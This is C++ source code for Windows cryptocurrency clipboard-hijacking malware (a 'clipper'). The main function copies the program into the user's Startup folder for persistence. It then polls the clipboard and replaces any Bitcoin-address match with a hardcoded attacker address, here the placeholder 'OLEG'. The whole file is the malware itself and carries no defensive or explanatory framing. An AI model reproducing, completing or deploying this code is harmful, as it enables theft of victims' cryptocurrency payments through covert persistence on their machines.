#include <Windows.h>
#include <shlobj_core.h>
#include <iostream>
#include <string>
#include <shlwapi.h>
#include "re.h"
#pragma comment(lib, "Shlwapi.lib")

char* GetClipboardText()
{
    static HANDLE clip;
    if (OpenClipboard(NULL))
    {
        clip = GetClipboardData(CF_TEXT);
        CloseClipboard();
    }
    return (char*)clip;
}

void SetClipboardText(const char* text)
{
    HGLOBAL global = GlobalAlloc(GMEM_FIXED, strlen(text) + 1);
    if (OpenClipboard(NULL))
    {
        EmptyClipboard();
        SetClipboardData(CF_TEXT, global);
        CloseClipboard();
    }
}

struct Crypto {
    const char* expression;
    const char* address;
};


Crypto cryptos[1] = { 
    {.expression = "^[13][a-km-zA-HJ-NP-Z1-9]*$", .address = "OLEG"},
};


int main() {
	TCHAR szStartup[MAX_PATH];
	TCHAR szExeName[MAX_PATH];

	SHGetFolderPath(NULL, CSIDL_STARTUP | CSIDL_FLAG_CREATE, NULL, 0, szStartup);
	PathAppend(szStartup, TEXT("clipper.exe"));
	GetModuleFileName(NULL, szExeName, MAX_PATH);
	CopyFile(szExeName, szStartup, false);

    while (true) {
        char* clipdata = GetClipboardText();
        if (clipdata != NULL) {
            for (auto const& crypto : cryptos) {
                int matchlen;
                int match = re_match(crypto.expression, clipdata, &matchlen);
                if (match != -1) {
                    SetClipboardText(crypto.address);
                }
            }
        }
        Sleep(50);
    }
}